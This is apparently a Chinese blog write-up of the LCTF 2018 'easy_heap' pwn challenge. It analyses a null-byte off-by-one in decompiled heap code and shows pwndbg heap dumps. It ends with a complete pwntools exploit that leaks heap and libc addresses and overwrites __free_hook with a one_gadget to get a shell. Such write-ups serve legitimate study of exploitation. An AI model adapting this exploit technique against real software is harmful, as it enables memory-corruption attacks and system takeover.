---
title: LCTF—easypwn详解
author: nepire
avatar: 'https://wx1.sinaimg.cn/large/006bYVyvgy1ftand2qurdj303c03cdfv.jpg'
authorLink: 'https://nepire.github.io/'
authorAbout: 逐梦者
authorDesc: 逐梦者
categories: 技术
comments: true
date: 2019-11-05 12:03:15
tags:
keywords:
description:
photos:
---
听说一血有pwnhub注册码拿就去试着打了一下周末的这场LCTF，结果作为签到题选手(笑)连签到题的一血都拿不到可能这就是命吧，不过遇到了一题不错的pwn，就详细的记录下解题思路和技巧吧

本文首发于[安全客—LCTF2018-easypwn-详细解析](https://www.anquanke.com/post/id/164591)






## easy pwn

先看下给的文件的基本信息

```bash
➜  easy_heap file easy_heap
easy_heap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a94f7ec039023e90d619f61acca68dd0863486c4, stripped
➜  easy_heap checksec easy_heap
[*] '/home/Ep3ius/pwn/process/easy_heap/easy_heap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

64位程序防护基本全开，接着我们ida看下程序反编译的结果

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int choice; // eax

  init_0();
  chunk_menu = calloc(0xA0uLL, 1uLL);
  if ( !chunk_menu )
  {
    puts("init error!");
    exit_();
  }
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      choice = read_input();
      if ( choice != 2 )
        break;
      delete();
    }
    if ( choice > 2 )
    {
      if ( choice == 3 )
      {
        show();
      }
      else if ( choice == 4 )
      {
        exit_();
      }
    }
    else if ( choice == 1 )
    {
      new();
    }
  }
}
```

我们可以看到这是一个基础的菜单型程序，这里比较在意的是程序先calloc了一个0xa0大小的堆块，我们先了解下malloc和 calloc的区别主要在于calloc在动态分配完内存后，自动初始化该内存空间为零，而malloc不初始化，里边数据是随机的垃圾数据。

```c
void new()
{
  __int64 v0; // rbx
  __int64 idx; // [rsp+0h] [rbp-20h]
  int idxa; // [rsp+0h] [rbp-20h]
  unsigned int chunk_size; // [rsp+4h] [rbp-1Ch]
  unsigned __int64 v4; // [rsp+8h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  LODWORD(idx) = 0;
  while ( idx <= 9 && *(16LL * idx + chunk_menu) )
    LODWORD(idx) = idx + 1;
  if ( idx == 10 )
  {
    puts("full!");
  }
  else
  {
    v0 = chunk_menu;
    *(v0 + 16LL * idx) = malloc(0xF8uLL);
    if ( !*(16LL * idx + chunk_menu) )
    {
      puts("malloc error!");
      exit_();
    }
    printf("size \n> ", idx, v4);
    chunk_size = read_input();
    if ( chunk_size > 0xF8 )
      exit_();
    *(16LL * idxa + chunk_menu + 8) = chunk_size;
    printf("content \n> ");
    read_input_content(*(16LL * idxa + chunk_menu), *(16LL * idxa + chunk_menu + 8));
  }
}
```

我们可以看到可以new的chunk的数量是最多时10个，并且malloc的新chunk位置都是在开头calloc的chunk后面，并且content的输入方式单独写了个函数，我们跟进去看看

```c
void __fastcall read_input_content(_BYTE *input, int chunk_size)
{
  unsigned int i; // [rsp+14h] [rbp-Ch]

  i = 0;
  if ( chunk_size )
  {
    while ( 1 )
    {
      read(0, &input[i], 1uLL);
      if ( chunk_size - 1 < i || !input[i] || input[i] == '\n' )
        break;
      ++i;
    }
    input[i] = 0;
    input[chunk_size] = 0;	#null byte off-by-one
  }
  else
  {
    *input = 0;
  }
}
```

我们结合前面的SIZE_MAX = 0xF8和malloc的都是0xF8可以发现，当我们new一个size=0xF8的chunk时他会把input[0xf8]赋值为0，但这就相当于把下一个chunk的size位覆盖了一个字节，我们具体调试一下

```python
#poc
new(0x10,'aaaa') #0
new(0x10,'aaaa') #1
free(0)
new(0xf8,'a'*0xf8) #0
```

```bash
pwndbg> parseheap
addr                prev                size                 status              fd                bk
0x558c833fa000      0x0                 0x250                Used                None              None
0x558c833fa250      0x0                 0xb0                 Used                None              None
0x558c833fa300      0x0                 0x100                Used                None              None
0x558c833fa400      0x0                 0x100                Used                None              None
pwndbg> x/8x 0x558c833fa400
0x558c833fa400:	0x0000000000000000	0x0000000000000101
0x558c833fa410:	0x0000000062626262	0x0000000000000000
0x558c833fa420:	0x0000000000000000	0x0000000000000000
0x558c833fa430:	0x0000000000000000	0x0000000000000000
# new(0xf8,'a'*0xf8)
pwndbg> parseheap
addr                prev                size                 status              fd                bk
0x558c833fa000      0x0                 0x250                Used                None              None
0x558c833fa250      0x0                 0xb0                 Used                None              None
0x558c833fa300      0x0                 0x100                Freed 0x61616161616161610x6161616161616161
0x558c833fa400      0x6161616161616161  0x100                Used                None              None
pwndbg> x/8x 0x558c833fa400
0x558c833fa400:	0x6161616161616161	0x0000000000000100  <== null byte overwrite
0x558c833fa410:	0x0000000062626262	0x0000000000000000
0x558c833fa420:	0x0000000000000000	0x0000000000000000
0x558c833fa430:	0x0000000000000000	0x0000000000000000
pwndbg>
```

我们可以看到chunk1的size位确实被\x00所覆盖了，也证明确实只要size=0xf8就可以overwrite一字节到下一个chunk的size位

接着我们看下delete和show函数

```c
void delete()
{
  unsigned int idx; // [rsp+4h] [rbp-Ch]

  printf("index \n> ");
  idx = read_input();
  if ( idx > 9 || !*(16LL * idx + chunk_menu) )
    exit_();
  memset(*(16LL * idx + chunk_menu), 0, *(16LL * idx + chunk_menu + 8));
  free(*(16LL * idx + chunk_menu));
  *(16LL * idx + chunk_menu + 8) = 0;
  *(16LL * idx + chunk_menu) = 0LL;
}
```

```c
void show()
{
  unsigned int idx; // [rsp+4h] [rbp-Ch]

  printf("index \n> ");
  idx = read_input();
  if ( idx > 9 || !*(16LL * idx + chunk_menu) )
    exit_();
  puts(*(16LL * idx + chunk_menu));
}
```

中规中矩，没有什么问题

分析完了在这里卡了很久，后来在调题目给的libc时秉持着瞎猫一般是能碰到死耗子的原则查了下libc的版本，结果还真的找到了是2.27

![1542542505625](E:\CTF\博客\投稿__LCTF—easypwn详解.assets\1542542505625.png)

要考虑tcache，马上切了个环境去调试(在这之前快被各种double free报错搞死了，哭)

我们先布局好7、8、9号堆

```python
new_tcache()
new(0x10,'aaaa') #7
new(0x10,'bbbb') #8
new(0x10,'cccc') #9
free_tcache()
free(7)
free(8)
free(9)
```

然后下面的操作看上去可能会很绕但想明白了就很明了了，我们先把0-6从tcache取出new好7、8、9号堆后再放回tcache后把chunk7释放这时我们再看下chunk7的状态

```bash
pwndbg> parseheap
addr                prev                size                 status              fd                bk
0x564965142000      0x0                 0x250                Used                None              None
0x564965142250      0x0                 0xb0                 Used                None              None
0x564965142300      0x0                 0x100                Used                None              None
0x564965142400      0x0                 0x100                Used                None              None
0x564965142500      0x0                 0x100                Used                None              None
0x564965142600      0x0                 0x100                Used                None              None
0x564965142700      0x0                 0x100                Used                None              None
0x564965142800      0x0                 0x100                Used                None              None
0x564965142900      0x0                 0x100                Used                None              None
0x564965142a00      0x0                 0x100                Freed     0x7fa21366eca0    0x7fa21366eca0
0x564965142b00      0x100               0x100                Used                None              None
0x564965142c00      0x200               0x100                Used                None              None
pwndbg> x/8x 0x564965142a00
0x564965142a00:	0x0000000000000000	0x0000000000000101
0x564965142a10:	0x00007fa21366eca0	0x00007fa21366eca0
0x564965142a20:	0x0000000000000000	0x0000000000000000
0x564965142a30:	0x0000000000000000	0x0000000000000000
pwndbg>
```

已经把main_arena放入在chunk里了，这时我们再把tcache清空后free8再重新取回来让chunk8_size=0xf8触发null byte off-by-one覆盖chunk9的previnuse位为0，让我们看下chunk现在的情况

```bash
pwndbg> parseheap
addr                prev                size                 status              fd                bk  
0x556bf9a1e000      0x0                 0x250                Used                None              None
0x556bf9a1e250      0x0                 0xb0                 Used                None              None
0x556bf9a1e300      0x0                 0x100                Used                None              None
0x556bf9a1e400      0x0                 0x100                Used                None              None
0x556bf9a1e500      0x0                 0x100                Used                None              None
0x556bf9a1e600      0x0                 0x100                Used                None              None
0x556bf9a1e700      0x0                 0x100                Used                None              None
0x556bf9a1e800      0x0                 0x100                Used                None              None
0x556bf9a1e900      0x0                 0x100                Used                None              None
0x556bf9a1ea00      0x0                 0x100                Freed     0x7f003ff88ca0    0x7f003ff88ca0
0x556bf9a1eb00      0x100               0x100                Freed 0x746972777265766f          0x392065
0x556bf9a1ec00      0x200               0x100                Used                None              None
pwndbg> x/8x 0x556bf9a1ea00
0x556bf9a1ea00:	0x0000000000000000	0x0000000000000101
0x556bf9a1ea10:	0x00007f003ff88ca0	0x00007f003ff88ca0
0x556bf9a1ea20:	0x0000000000000000	0x0000000000000000
0x556bf9a1ea30:	0x0000000000000000	0x0000000000000000
pwndbg> x/8x 0x556bf9a1eb00
0x556bf9a1eb00:	0x0000000000000100	0x0000000000000100
0x556bf9a1eb10:	0x746972777265766f	0x0000000000392065
0x556bf9a1eb20:	0x0000000000000000	0x0000000000000000
0x556bf9a1eb30:	0x0000000000000000	0x0000000000000000
pwndbg> x/8x 0x556bf9a1ec00
0x556bf9a1ec00:	0x0000000000000200	0x0000000000000100
0x556bf9a1ec10:	0x0000000063636363	0x0000000000000000
0x556bf9a1ec20:	0x0000000000000000	0x0000000000000000
0x556bf9a1ec30:	0x0000000000000000	0x0000000000000000
```

这时我们可以看到chunk9的pre_size位位0x200chunk9的previnuse位也为0，就可以尝试一波unlink了，先把tcache填满，再free9后，我们再看下chunk

```bash
pwndbg> parseheap
addr                prev                size                 status              fd                bk
0x5624364b4000      0x0                 0x250                Used                None              None
0x5624364b4250      0x0                 0xb0                 Used                None              None
0x5624364b4300      0x0                 0x100                Used                None              None
0x5624364b4400      0x0                 0x100                Used                None              None
0x5624364b4500      0x0                 0x100                Used                None              None
0x5624364b4600      0x0                 0x100                Used                None              None
0x5624364b4700      0x0                 0x100                Used                None              None
0x5624364b4800      0x0                 0x100                Used                None              None
0x5624364b4900      0x0                 0x100                Used                None              None
```

我们接着把tcache清空，新建chunk9和overwrite到chunk8的chunk7，再把chunk6和chunk9释放掉后，这时chunk7里存的就是heap地址了，show(7)便可以泄露heapbase

```bash
pwndbg> parseheap
addr                prev                size                 status              fd                bk
0x55fe2fe46000      0x0                 0x250                Used                None              None
0x55fe2fe46250      0x0                 0xb0                 Used                None              None
0x55fe2fe46300      0x0                 0x100                Used                None              None
0x55fe2fe46400      0x0                 0x100                Used                None              None
0x55fe2fe46500      0x0                 0x100                Used                None              None
0x55fe2fe46600      0x0                 0x100                Used                None              None
0x55fe2fe46700      0x0                 0x100                Used                None              None
0x55fe2fe46800      0x0                 0x100                Used                None              None
0x55fe2fe46900      0x0                 0x100                Used                None              None
0x55fe2fe46a00      0x0                 0x100                Used                None              None
0x55fe2fe46b00      0x100               0x100                Used                None              None
pwndbg> x/8x 0x55fe2fe46b00
0x55fe2fe46b00:	0x0000000000000100		0x0000000000000101
0x55fe2fe46b10:	0x000055fe2fe46310 <==	0x0000000000000000
0x55fe2fe46b20:	0x0000000000000000		0x0000000000000000
0x55fe2fe46b30:	0x0000000000000000		0x0000000000000000
```

之后就是想办法去泄露libc地址了，这步也卡了很久，本来是想通过tcache_dup修改chunk7里的数据改成那个存着libc地址的地址，后来发现真的被自己蠢哭，最后我是把chunk_menu也就是一开始calloc的0xb0的chunk里面chunk7的指针通过tcache_dup改成存着libc地址的chunk再leak出来

```bash
pwndbg> heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x565551ed3c00 (size : 0x20400)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x100)   tcache_entry[14]:0x565551ed3b10 --> 0x565551ed3b10 (overlap chunk with 0x565551ed3b00(freed) )
pwndbg> parseheap
addr                prev                size                 status              fd                bk                
0x565551ed3000      0x0                 0x250                Used                None              None
0x565551ed3250      0x0                 0xb0                 Used                None              None
0x565551ed3300      0x0                 0x100                Used                None              None
0x565551ed3400      0x0                 0x100                Used                None              None
0x565551ed3500      0x0                 0x100                Used                None              None
0x565551ed3600      0x0                 0x100                Used                None              None
0x565551ed3700      0x0                 0x100                Used                None              None
0x565551ed3800      0x0                 0x100                Used                None              None
0x565551ed3900      0x0                 0x100                Used                None              None
0x565551ed3a00      0x0                 0x100                Used                None              None
0x565551ed3b00      0x100               0x100                Used                None              None
pwndbg>
```

在泄露出了libc地址后基本就是为所欲为了，重新做个tcache_dup把free_hook修改成one_gadget就直接getshell了，这里贴上exp

```python
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
n = process('./easy_heap')
#n = remote('118.25.150.134',6666)
elf = ELF('./easy_heap')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def new_0():
    n.recvuntil('which command?\n> ')
    n.sendline("1")
    n.recvuntil('> ')
    n.sendline('0')

def new(size,content):
    n.recvuntil('which command?\n> ')
    n.sendline("1")
    n.recvuntil('size \n> ')
    n.sendline(str(size))
    n.recvuntil('content \n> ')
    n.sendline(content)

def free(idx):
    n.recvuntil('which command?\n> ')
    n.sendline("2")
    n.recvuntil('index \n> ')
    n.sendline(str(idx))

def show(idx):
    n.recvuntil('which command?\n> ')
    n.sendline("3")
    n.recvuntil('index \n> ')
    n.sendline(str(idx))

def new_tcache():
    for i in range(7):
        new(0x10,'aaaa')

def free_tcache():
    for i in range(0,7):
        free(i)

new_tcache()
new(0x10,'aaaa') #7
new(0x10,'bbbb') #8
new(0x10,'cccc') #9
free_tcache()

free(7)
free(8)
free(9)

new_tcache()
new(0x10,'aaaa') #7
new(0x10,'bbbb') #8
new(0x10,'cccc') #9

free_tcache()
free(7)


new_tcache()
free(8)
new(0xf8,'overwrite 9')

free_tcache()
free(9)

new_tcache()
new(0x10,'aaaa') #9
new(0x10,'bbbb') #7(8)
free(6)
free(9)
show(7)

heap_base = u64(n.recv(6)+'\x00\x00')
print hex(heap_base)

free(7)
new(0xf0,p64(heap_base-64)) #7
new(0xf0,'aaaa') #7_2
new(0xf0,p64(heap_base+0x700+0x8))
show(7)
libc_base = u64(n.recv(6)+'\x00\x00') - 0x3ebca0
print hex(libc_base)
free_hook = libc.symbols['__free_hook']+libc_base
print "free_hook",hex(free_hook)
one_gadget = libc_base + 0x4f322

free(6)
free(9)
new(0xf0,p64(free_hook))
new(0xf0,'aaaa')
new(0xf0,p64(one_gadget))


n.interactive()
```



### 总结

这次LCTF学到了不少，感谢丁佬没打死我还告诉我调试得出来puts出来的是里面的值里面不是指针，下次一定要好好学习跟上大哥们的解题速度
